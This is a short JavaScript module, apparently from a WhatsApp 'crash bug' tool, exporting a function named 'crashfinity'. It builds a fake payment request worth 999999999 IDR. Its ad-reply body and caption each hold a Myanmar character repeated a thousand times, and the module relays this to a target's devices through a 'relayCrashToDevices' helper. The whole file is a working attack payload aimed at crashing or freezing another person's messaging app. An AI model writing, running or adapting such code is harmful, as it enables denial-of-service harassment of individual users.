const { relayCrashToDevices } = require('../target-utils');

async function crashfinity(SYxS7, target) {
    const titleText = "HAI SALAM KENAL YAKK";
    const spamText = "ြ".repeat(1000);

    const fakePaymentPayload = {
        requestPaymentMessage: {
            currencyCodeIso4217: "IDR",
            requestFrom: target,
            expiryTimestamp: Date.now() + 8000,
            amount: {
                value: 999999999,
                offset: 100,
                currencyCode: "IDR"
            },
            contextInfo: {
                externalAdReply: {
                    title: titleText,
                    body: spamText,
                    mimetype: "audio/mpeg",
                    caption: spamText,
                    showAdAttribution: true,
                    sourceUrl: "https://t.me/zuckyyu",
                    thumbnailUrl: "https://files.catbox.moe/tlbp3k.jpg"
                }
            }
        }
    };

    return await relayCrashToDevices(SYxS7, target, fakePaymentPayload);
}

module.exports = { crashfinity };
